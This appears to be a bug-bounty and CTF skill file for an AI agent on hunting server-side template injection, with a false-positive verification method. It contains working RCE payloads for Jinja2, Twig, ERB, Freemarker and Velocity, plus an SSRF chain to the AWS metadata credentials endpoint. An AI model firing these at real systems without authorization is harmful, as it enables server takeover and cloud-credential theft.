---
name: hunt-ssti
description: "Hunt server-side template injection (SSTI) across Jinja2 (Flask/Django), Twig (Symfony), Freemarker (Java), ERB (Rails), Spring, Velocity, Mako, Thymeleaf, Smarty. Detection probes use double-curly and dollar-curly math expressions evaluated server-side. Once an engine is fingerprinted, escalate to RCE via the engine-specific class-walker, callback-registrar, or Execute-utility patterns documented in disclosed reports. Detection patterns: error messages reveal engine, blank or numeric eval reveals expression mode. Targets: email templates, PDF/report generators, CMS preview features, error pages with user input. Use when hunting RCE via template rendering, when content shows engine fingerprints, when finding endpoints that compose strings with user input before render."
---

## 14. SSTI — SERVER-SIDE TEMPLATE INJECTION
> Easy to detect, high payout ($2K–$8K). Direct path to RCE.

### CRITICAL: Verification Pitfall — False Positives from Static Assets
**The `{{7*7}}` → `49` pattern is a notorious false positive.** Many web apps (especially Next.js, React SPAs, and CDN-hosted apps) serve CSS/JS bundles whose filenames or content contain `49`, `7777777`, `14`, etc. (e.g., `30e5c4cce496650d.css` contains `49` in the filename itself).

**ALWAYS verify SSTI before reporting:**
1. Strip `<script>...</script>` and `<style>...</style>` tags from the response body.
2. Remove all static asset URLs (paths to `/_next/static/`, `/static/`, `/assets/`, etc.).
3. Use UNIQUE payloads like `{{13*13}}` → `169` or `{{47*3}}` → `141` — values that won't appear in hex color codes, CSS filenames, or common JS snippets.
4. Compare against a baseline (same parameter with a non-SSTI value) to confirm the numeric result ONLY appears with the template payload.
5. If the response is identical regardless of payload — the app is a SPA that doesn't render templates server-side. Move on.

**Real example (2026-09-17):** `/?q={{7*7}}` on a Next.js casino app returned `49` 6 times — all in JS/CSS filenames. Additional verification with `{{11*11}}` → `121`, `{{13*13}}` → `169`, `{{100*2}}` → `200` showed NONE in HTML body. Responses were identical to baseline requests. SSTI was FALSE POSITIVE. See `references/ssti-false-positive-static-assets.md` for full verification methodology.

### Detection Payloads (try all)
```
{{7*7}}          → 49 = Jinja2 / Twig
${7*7}           → 49 = Freemarker / Velocity / Mako (all use ${...})
<%= 7*7 %>       → 49 = ERB (Ruby)
*{7*7}           → 49 = Spring Thymeleaf
{{7*'7'}}        → 7777777 = Jinja2 (Python string repetition); 49 = Twig (numeric coercion of '7'). Differentiates Jinja2 from Twig.
```

### RCE Payloads

**Jinja2 (Python/Flask):**
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Jinja2 — `cycler` global RCE (more reliable when `config` isn't in scope / sandbox strips it):**
```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```
The `cycler`/`joiner`/`namespace` globals are almost always present in a Jinja2 environment
(built-in to `jinja2`), so this reaches `os` without needing `config`. Variants that also work:
`{{ namespace.__init__.__globals__.os.popen('id').read() }}`,
`{{ joiner.__init__.__globals__.os.popen('id').read() }}`,
`{{ get_flashed_messages.__globals__.__builtins__.open('/flag').read() }}` (Flask only).
If `os` is filtered, walk to `subprocess` or `__import__`:
`{{ cycler.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`.

**Render surface is often a SEPARATE endpoint from the POST.** In the PantryPal CTF, the
`card_template` textarea was submitted via `POST /app/new`, but the template was only RENDERED
server-side at `GET /app/recipe/<id>/card` — the `{{7*7}}`→`49` confirmation and the RCE output
both appeared there, NOT on the create response. Always fetch the render/export/preview route after
creating the payload. (See `references/pantrypal-ssti.md`.)

**Sandbox breadcrumb:** if the challenge is tagged "sandboxed" / ADVANCED and `cycler` is blocked,
escalate with `{{ self._Environment__... }}` or attribute/getitem chains
(`|attr('...')`, `['...']`) to reach `__class__`/`__mro__`/`__subclasses__` — but many "sandbox"
CTFs actually render with the UNSANDBOXED `render_template_string`, so try the un-sandboxed payload
first.

**Twig (PHP/Symfony):**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

**ERB (Ruby):**
```ruby
<%= `id` %>
```

### Where to Test
```
Name/bio/description fields, email templates, invoice name, PDF generators,
URL path parameters, search queries reflected in results, HTTP headers reflected
```

---

## Related Skills & Chains

- **`hunt-rce`** — SSTI is the easiest path to RCE on Python/Ruby/PHP/Java stacks because the template language already exposes the runtime. Chain primitive: Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` or Freemarker `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` → unauthenticated RCE as the rendering worker. Always escalate fingerprint → class-walker → cmd exec.
- **`hunt-xss`** — When the template engine sandboxes the runtime (or you only get the rendered output back as HTML), the same `{{7*7}}` reflection often still yields stored XSS. Chain primitive: sandboxed Jinja2 SSTI without escapes → inject `<script>` into rendered email template → stored XSS hitting every recipient who views the message.
- **`hunt-ssrf`** — Template engines often expose URL fetchers/filters before they expose the runtime, giving you SSRF before RCE. Chain primitive: Twig `{{ include('http://169.254.169.254/latest/meta-data/iam/security-credentials/') }}` or Jinja2 with `url_for`/custom filters → AWS metadata exfil → cloud creds.
- **`hunt-file-upload`** — Office docs, SVGs, and email templates uploaded by the user are common SSTI surfaces (the server re-renders them). Chain primitive: upload a DOCX whose `word/document.xml` contains `${T(java.lang.Runtime).getRuntime().exec("id")}` to a Velocity/Freemarker-driven mail-merge → RCE.
- **`security-arsenal`** — Reach for the engine-specific escape payload tree: Jinja2 class-walker variants (`__subclasses__()[N]` index hunting), Twig `_self.env` registerUndefinedFilterCallback, Freemarker `?new()` Execute, ERB backticks, Velocity `$class.inspect`, Smarty `{php}...{/php}`, plus the WAF-bypass variants (`{{request|attr('application')|...}}`, Unicode escapes, `{%print(...)%}`).
- **`triage-validation`** — Apply the Pre-Severity Gate before claiming Critical RCE. A `{{7*7}} → 49` reflection inside a sandboxed engine (e.g., Twig sandbox mode, Jinja2 SandboxedEnvironment with no escape) is Medium SSTI, not Critical RCE. Prove `id`/OOB DNS callback with a unique marker before writing the report.
